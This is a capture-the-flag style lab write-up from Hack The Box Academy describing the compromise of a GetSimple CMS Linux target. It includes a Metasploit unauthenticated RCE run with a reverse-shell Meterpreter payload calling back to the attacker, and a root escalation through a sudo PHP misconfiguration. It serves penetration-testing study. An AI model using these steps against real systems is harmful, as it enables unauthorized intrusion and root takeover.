# Hack The Box Academy — Getting Started | Knowledge Check

## Overview

In this hands-on penetration testing lab, I practiced the complete exploitation process against a vulnerable Linux machine running GetSimple CMS.

The objective was to identify exposed services, enumerate the web application, discover a suitable vulnerability, gain initial access, and escalate privileges from a low-privileged web server account to root.

**Platform:** Hack The Box Academy  
**Module:** Getting Started — Knowledge Check  
**Target:** Linux (Ubuntu)  
**Web Application:** GetSimple CMS  
**Tools:** Nmap, WhatWeb, SearchSploit, Metasploit Framework, Meterpreter, Linux CLI

## 1. Reconnaissance and Enumeration

I started by performing a comprehensive Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.140.209 -oN knowledge-check-nmap.txt
```

The scan revealed:

- **Port 22:** OpenSSH 8.2p1
- **Port 80:** Apache HTTP Server 2.4.41
- **Web application:** GetSimple CMS
- **Interesting directory:** `/admin/`

I then used WhatWeb to fingerprint the web application:

```bash
whatweb http://10.129.140.209
```

Further enumeration identified the virtual host `gettingstarted.htb`, which I added to my local hosts file.

## 2. Vulnerability Discovery

I used SearchSploit to identify publicly documented vulnerabilities affecting GetSimple CMS.

```bash
searchsploit getsimple
```

The results included an unauthenticated remote code execution exploit.

I also discovered that the application's `authorization.xml` file was publicly accessible, exposing an API key. This demonstrated an additional information disclosure issue.

## 3. Initial Foothold — Remote Code Execution

I used the Metasploit Framework to test the GetSimple CMS unauthenticated RCE module.

```text
msfconsole -q
use exploit/multi/http/getsimplecms_unauth_code_exec
set RHOSTS 10.129.140.209
set LHOST 10.10.15.10
set RPORT 80
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
exploit
```

The exploitation succeeded, establishing a Meterpreter session on the target.

I verified the compromised account:

```text
getuid
```

**Result:** `www-data`

This confirmed remote code execution under the web server's restricted user account.

## 4. User Flag Discovery

After obtaining a Meterpreter session, I opened a system shell and enumerated the home directories.

```bash
ls -la /home
ls -la /home/mrb3n
```

I identified the `user.txt` flag in the home directory of the local user `mrb3n`.

```bash
cat /home/mrb3n/user.txt
```

## 5. Privilege Escalation — Sudo Misconfiguration

The next objective was to escalate privileges from `www-data` to `root`.

I enumerated the available sudo permissions:

```bash
sudo -l
```

The output revealed a critical misconfiguration:

```text
(ALL : ALL) NOPASSWD: /usr/bin/php
```

This configuration allowed the `www-data` account to execute the PHP interpreter with elevated privileges without entering a password.

The identified privilege escalation technique was:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

This command uses PHP's `system()` function to launch a Bash shell with root privileges.

The final verification and flag retrieval commands were:

```bash
id
cat /root/root.txt
```

## 6. Security Findings

**Finding 1 — Unauthenticated Remote Code Execution**

The vulnerable GetSimple CMS installation exposed an attack path that allowed remote code execution without valid application credentials.

**Finding 2 — Sensitive Configuration Exposure**

A publicly accessible XML configuration file disclosed an application API key.

**Finding 3 — Insecure Sudo Permissions**

The web server account was permitted to execute the PHP interpreter as root without password authentication, creating a direct privilege escalation path.

## 7. Key Takeaways

This lab reinforced several important penetration testing concepts:

- Systematic network and web application enumeration.
- Identifying vulnerable technologies using SearchSploit.
- Exploiting web application vulnerabilities with Metasploit.
- Understanding Meterpreter sessions and Linux system shells.
- Enumerating local users and file permissions.
- Identifying dangerous sudo configurations.
- Understanding the difference between initial access and root-level compromise.

The most valuable lesson was that successful penetration testing requires connecting individual findings into a complete attack chain, from initial reconnaissance to privilege escalation.

**Learning Path:** HTB Academy — Penetration Testing / CPTS Preparation

*All activities were performed within an authorized Hack The Box training environment.*



<img width="1032" height="658" alt="image" src="https://github.com/user-attachments/assets/69faea56-b138-4e5b-be10-d98fa4a3b9cb" />
<img width="1132" height="432" alt="image" src="https://github.com/user-attachments/assets/ec26cb6e-9ce5-49cd-8916-2a1d77d990fe" />

<img width="735" height="235" alt="image" src="https://github.com/user-attachments/assets/5872b23e-b4f3-44d9-b421-61a6e94fb014" />
<img width="922" height="330" alt="image" src="https://github.com/user-attachments/assets/f3a8a711-d507-4d1e-99d7-dd529fbc01c1" />

<img width="1036" height="281" alt="image" src="https://github.com/user-attachments/assets/f6163ec7-51d7-4dc1-876e-da8d35968bd3" />

Final question, cat root
<img width="1061" height="650" alt="image" src="https://github.com/user-attachments/assets/922749ce-0217-417d-a80b-f5ee24f41920" />





